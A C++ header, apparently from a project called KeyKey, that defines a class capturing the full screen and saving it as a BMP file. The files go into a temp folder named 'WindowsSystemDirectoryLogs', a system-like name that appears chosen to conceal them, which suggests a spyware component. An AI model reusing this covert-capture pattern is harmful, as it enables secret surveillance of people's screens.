#pragma once
// KeyKey.cpp : Defines the entry point for the console application.
//
#include <stdio.h>
#include <windows.h>
#include <fstream>
#include <string.h>
#include <winstring.h>
#include <String>
#include <atlstr.h>  
#include <iostream>
#include <direct.h>
using namespace std;
class CaptureSCR
{
public:
	CaptureSCR();
	~CaptureSCR();
	inline int GetFilePointer(HANDLE FileHandle) {
		return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
	}
	bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height) {
		bool Success = false;
		HDC SurfDC = NULL;        // GDI-compatible device context for the surface
		HBITMAP OffscrBmp = NULL; // bitmap that is converted to a DIB
		HDC OffscrDC = NULL;      // offscreen DC that we can select OffscrBmp into
		LPBITMAPINFO lpbi = NULL; // bitmap format info; used by GetDIBits
		LPVOID lpvBits = NULL;    // pointer to bitmap bits array
		HANDLE BmpFile = INVALID_HANDLE_VALUE;    // destination .bmp file
		BITMAPFILEHEADER bmfh;  // .bmp file header

								// We need an HBITMAP to convert it to a DIB:
		if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
			return false;

		// The bitmap is empty, so let's copy the contents of the surface to it.
		// For that we need to select it into a device context. We create one.
		if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
			return false;

		// Select OffscrBmp into OffscrDC:
		HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);

		// Now we can copy the contents of the surface to the offscreen bitmap:
		BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);

		// GetDIBits requires format info about the bitmap. We can have GetDIBits
		// fill a structure with that info if we pass a NULL pointer for lpvBits:
		// Reserve memory for bitmap info (BITMAPINFOHEADER + largest possible
		// palette):
		if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL)
			return false;


		ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
		lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		// Get info but first de-select OffscrBmp because GetDIBits requires it:
		SelectObject(OffscrDC, OldBmp);
		if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
			return false;

		// Reserve memory for bitmap bits:
		if ((lpvBits = new char[lpbi->bmiHeader.biSizeImage]) == NULL)
			return false;

		// Have GetDIBits convert OffscrBmp to a DIB (device-independent bitmap):
		if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
			return false;
		CHAR temp[MAX_PATH];
		CString path_full;
		GetTempPathA(255, temp);
		strcat_s(temp, "WindowsSystemDirectoryLogs");
		DWORD attribs = GetFileAttributesA(temp);
		if (attribs == INVALID_FILE_ATTRIBUTES)
			CreateDirectoryA(temp, NULL);
		path_full = temp + CString("\\") + CString(filename);
		CString cstr = path_full;
		// Create a file to save the DIB to:
		if ((BmpFile = CreateFile(cstr,
			GENERIC_WRITE,
			0, NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL)) == INVALID_HANDLE_VALUE)

			return false;

		DWORD Written;    // number of bytes written by WriteFile

						  // Write a file header to the file:
		bmfh.bfType = 19778;        // 'BM'
									// bmfh.bfSize = ???        // we'll write that later
		bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
		// bmfh.bfOffBits = ???     // we'll write that later
		if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
			return false;

		if (Written < sizeof(bmfh))
			return false;

		// Write BITMAPINFOHEADER to the file:
		if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL))
			return false;

		if (Written < sizeof(BITMAPINFOHEADER))
			return false;

		// Calculate size of palette:
		int PalEntries;
		// 16-bit or 32-bit bitmaps require bit masks:
		if (lpbi->bmiHeader.biCompression == BI_BITFIELDS)
			PalEntries = 3;
		else
			// bitmap is palettized?
			PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?
			// 2^biBitCount palette entries max.:
			(int)(1 << lpbi->bmiHeader.biBitCount)
			// bitmap is TrueColor -> no palette:
			: 0;
		// If biClrUsed use only biClrUsed palette entries:
		if (lpbi->bmiHeader.biClrUsed)
			PalEntries = lpbi->bmiHeader.biClrUsed;

		// Write palette to the file:
		if (PalEntries) {
			if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL))
				return false;

			if (Written < PalEntries * sizeof(RGBQUAD))
				return false;
		}

		// The current position in the file (at the beginning of the bitmap bits)
		// will be saved to the BITMAPFILEHEADER:
		bmfh.bfOffBits = GetFilePointer(BmpFile);

		// Write bitmap bits to the file:
		if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL))
			return false;

		if (Written < lpbi->bmiHeader.biSizeImage)
			return false;

		// The current pos. in the file is the final file size and will be saved:
		bmfh.bfSize = GetFilePointer(BmpFile);
		// We have all the info for the file header. Save the updated version:
		SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
		if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
			return false;

		if (Written < sizeof(bmfh))
			return false;

		return true;
	}
	bool ScreenCapture(int x, int y, char *filename)
	{
		HDC hDc = CreateCompatibleDC(0);
		int x1, y1, x2, y2;
		int width;
		int height;
		// get screen dimensions
		x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
		y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
		x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
		y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
		width = x2 - x1;
		height = y2 - y1;
		// make a bmp in memory to store the capture in
		HBITMAP hBmp = CreateCompatibleBitmap(GetDC(NULL), width, height);

		// join em up
		SelectObject(hDc, hBmp);

		// copy from the screen to my bitmap
		BitBlt(hDc, 0, 0, width, height, GetDC(0), x1, y1, SRCCOPY);

		// save my bitmap
		bool ret = SaveBMPFile(filename, hBmp, hDc, width, height);

		// free the bitmap memory
		DeleteObject(hBmp);

		return ret;
	}

};

// Helper function to retrieve current position of file pointer:

//---------------------------------------------------------------------------

// Screenshot
//    -> FileName: Name of file to save screenshot to
//    -> lpDDS: DirectDraw surface to capture
//    <- Result: Success
//
